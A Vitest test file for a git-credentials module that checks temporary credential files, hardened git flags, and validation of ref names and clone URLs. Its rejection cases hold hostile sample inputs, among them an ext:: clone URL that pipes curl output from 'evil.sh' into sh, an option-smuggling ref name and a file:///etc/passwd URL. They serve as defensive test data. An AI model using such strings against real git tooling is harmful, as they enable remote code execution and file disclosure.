import { existsSync, readFileSync } from 'fs';
import { dirname } from 'path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const mocks = vi.hoisted(() => ({
  execFileAsync: vi.fn(),
}));

vi.mock('./execution/exec', () => ({
  execFileAsync: mocks.execFileAsync,
}));

const {
  assertSafeCloneUrl,
  assertSafeRefName,
  buildHardenedGitArgs,
  createGitCredentialConfig,
  execGit,
  execGitWithCredentials,
  HARDENED_GIT_ENV,
} = await import('./git-credentials');

const HARDENED_PREFIX = [
  '-c', 'core.hooksPath=/dev/null',
  '-c', 'core.fsmonitor=',
  '-c', 'core.pager=cat',
  '-c', 'protocol.allow=never',
  '-c', 'protocol.https.allow=always',
];

describe('git credentials', () => {
  beforeEach(() => {
    mocks.execFileAsync.mockReset();
  });

  it('omits credential helper when no access token is provided', () => {
    const config = createGitCredentialConfig(null);

    expect(config.args).toEqual([]);
    expect(config.cleanup()).toBeUndefined();
  });

  it('writes an encoded credential helper file for http remotes', () => {
    const config = createGitCredentialConfig('tok/en with spaces', 'https://github.com/acme/repo.git');
    const helperArg = config.args[1];
    const credentialsFile = helperArg.slice('credential.helper=store --file='.length);

    try {
      expect(config.args[0]).toBe('-c');
      expect(readFileSync(credentialsFile, 'utf8')).toBe(
        'https://oauth2:tok%2Fen%20with%20spaces@github.com\n',
      );
    } finally {
      config.cleanup();
    }

    expect(existsSync(dirname(credentialsFile))).toBe(false);
  });

  it('falls back to GitHub credentials for non-url remotes', () => {
    const config = createGitCredentialConfig('token', 'git@github.com:acme/repo.git');
    const credentialsFile = config.args[1].slice('credential.helper=store --file='.length);

    try {
      expect(readFileSync(credentialsFile, 'utf8')).toBe('https://oauth2:token@github.com\n');
    } finally {
      config.cleanup();
    }
  });

  it('falls back to GitHub credentials for parsed non-http remotes', () => {
    const config = createGitCredentialConfig('token', 'ftp://example.com/repo.git');
    const credentialsFile = config.args[1].slice('credential.helper=store --file='.length);

    try {
      expect(readFileSync(credentialsFile, 'utf8')).toBe('https://oauth2:token@github.com\n');
    } finally {
      config.cleanup();
    }
  });

  it('uses GitHub credentials when no remote URL is available', () => {
    const config = createGitCredentialConfig('token');
    const credentialsFile = config.args[1].slice('credential.helper=store --file='.length);

    try {
      expect(readFileSync(credentialsFile, 'utf8')).toBe('https://oauth2:token@github.com\n');
    } finally {
      config.cleanup();
    }
  });

  it('executes git with temporary credentials, hardened flags/env, and always cleans up', async () => {
    mocks.execFileAsync.mockResolvedValue({ stdout: 'ok', stderr: '' });

    await expect(execGitWithCredentials(['status'], 'token', 'https://github.com/acme/repo.git', {
      cwd: '/repo',
    })).resolves.toEqual({ stdout: 'ok', stderr: '' });

    expect(mocks.execFileAsync).toHaveBeenCalledTimes(1);
    const [file, args, options] = mocks.execFileAsync.mock.calls[0];
    expect(file).toBe('git');
    expect(args.slice(0, HARDENED_PREFIX.length)).toEqual(HARDENED_PREFIX);
    const credentialArgIndex = args.indexOf('status') - 2;
    expect(args[credentialArgIndex]).toBe('-c');
    expect(args[credentialArgIndex + 1]).toContain('credential.helper=store --file=');
    expect(args[args.length - 1]).toBe('status');
    expect(options.cwd).toBe('/repo');
    expect(options.env).toEqual(expect.objectContaining(HARDENED_GIT_ENV));

    const credentialsFile = args[credentialArgIndex + 1].slice('credential.helper=store --file='.length);
    expect(existsSync(dirname(credentialsFile))).toBe(false);
  });

  it('builds hardened args ahead of the caller-supplied args', () => {
    expect(buildHardenedGitArgs(['status'])).toEqual([...HARDENED_PREFIX, 'status']);
  });

  it('runs execGit with hardened args and merges caller env on top of the hardening', async () => {
    mocks.execFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

    await execGit(['-C', '/repo', 'status'], { env: { CUSTOM: '1' } });

    expect(mocks.execFileAsync).toHaveBeenCalledWith(
      'git',
      [...HARDENED_PREFIX, '-C', '/repo', 'status'],
      { env: expect.objectContaining({ CUSTOM: '1', ...HARDENED_GIT_ENV }) },
    );
  });

  it('defaults execGit env to process.env merged with the hardening', async () => {
    mocks.execFileAsync.mockResolvedValue({ stdout: '', stderr: '' });

    await execGit(['status']);

    const [, , options] = mocks.execFileAsync.mock.calls[0];
    expect(options.env).toEqual(expect.objectContaining(HARDENED_GIT_ENV));
  });

  describe('assertSafeRefName', () => {
    it('accepts ordinary ref names', () => {
      expect(assertSafeRefName('openlinear/task-1')).toBe('openlinear/task-1');
      expect(assertSafeRefName('main')).toBe('main');
      expect(assertSafeRefName('release/1.2.3')).toBe('release/1.2.3');
    });

    it.each([
      ['', 'empty string'],
      ['-upload-pack=evil', 'leading dash'],
      ['/leading-slash', 'leading slash'],
      ['trailing-slash/', 'trailing slash'],
      ['.leading-dot', 'leading dot'],
      ['trailing-dot.', 'trailing dot'],
      ['has..dotdot', 'dot-dot traversal'],
      ['has space', 'whitespace'],
      ['has\ttab', 'control character'],
      ['has;semicolon', 'shell metacharacter'],
      [null, 'non-string'],
      [undefined, 'undefined'],
    ])('rejects %j (%s)', (value) => {
      expect(() => assertSafeRefName(value)).toThrow('[Sidecar] Refusing unsafe ref name');
    });

    it('includes the provided description in the error', () => {
      expect(() => assertSafeRefName('-bad', 'default branch')).toThrow(
        '[Sidecar] Refusing unsafe default branch',
      );
    });
  });

  describe('assertSafeCloneUrl', () => {
    const ORIGINAL_GITHUB_HOST = process.env.GITHUB_HOST;

    beforeEach(() => {
      delete process.env.GITHUB_HOST;
    });

    afterEach(() => {
      if (ORIGINAL_GITHUB_HOST === undefined) {
        delete process.env.GITHUB_HOST;
      } else {
        process.env.GITHUB_HOST = ORIGINAL_GITHUB_HOST;
      }
    });

    it('accepts an https github.com URL', () => {
      expect(assertSafeCloneUrl('https://github.com/acme/repo.git')).toBe(
        'https://github.com/acme/repo.git',
      );
    });

    it('respects a configured GITHUB_HOST allowlist', () => {
      process.env.GITHUB_HOST = 'github.example.com';
      expect(assertSafeCloneUrl('https://github.example.com/acme/repo.git')).toBe(
        'https://github.example.com/acme/repo.git',
      );
      expect(() => assertSafeCloneUrl('https://github.com/acme/repo.git')).toThrow(
        'host must be github.example.com',
      );
    });

    it.each([
      ['', 'empty string'],
      ['not a url', 'unparsable string'],
      ['ext::sh -c "curl evil.sh|sh"', 'ext:: remote helper'],
      ['file:///etc/passwd', 'file:// scheme'],
      ['ssh://git@github.com/acme/repo.git', 'ssh:// scheme'],
      ['http://github.com/acme/repo.git', 'non-https scheme'],
      ['https://evil.example.com/acme/repo.git', 'disallowed host'],
      [null, 'non-string'],
    ])('rejects %j (%s)', (value) => {
      expect(() => assertSafeCloneUrl(value)).toThrow('[Sidecar] Refusing unsafe clone URL');
    });
  });
});
